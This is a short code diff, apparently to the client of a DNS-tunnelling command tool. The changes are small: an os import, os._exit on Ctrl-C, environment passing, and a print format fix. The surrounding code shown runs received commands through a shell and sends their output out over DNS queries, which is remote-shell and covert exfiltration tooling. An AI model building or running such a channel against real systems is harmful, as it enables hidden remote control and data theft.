@@ -10,11 +10,12 @@ import argparse
 import zlib
 import hashlib
 import signal
+import os
 
 
 def ctrl_c_handler(signal, frame):
     print("\nClient Stopped")
-    exit(0)
+    os._exit(0)
 
 
 signal.signal(signal.SIGINT, ctrl_c_handler)
@@ -68,7 +69,10 @@ recv = b""  # Buffer of received data to process
 
 # Execute shell command
 def execute(cmd: str) -> bytes:
-    out, err = subprocess.Popen([cmd], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+    out, err = subprocess.Popen([cmd],
+                                env=os.environ.copy(),
+                                stdout=subprocess.PIPE,
+                                stderr=subprocess.PIPE,
                                 shell=True).communicate()
 
     if out:
@@ -158,7 +162,7 @@ def decode(data: bytes) -> str:
 # Send data over DNS
 def send_data(cmd: str, data: bytes) -> None:
     frag_e_data = encode(data)
-    print("{:25}(Packets required: {})".format(cmd, len(frag_e_data)))
+    print("{:25} (Packets required: {})".format(cmd, len(frag_e_data)))
 
     req = []
     for i, data in enumerate(frag_e_data):
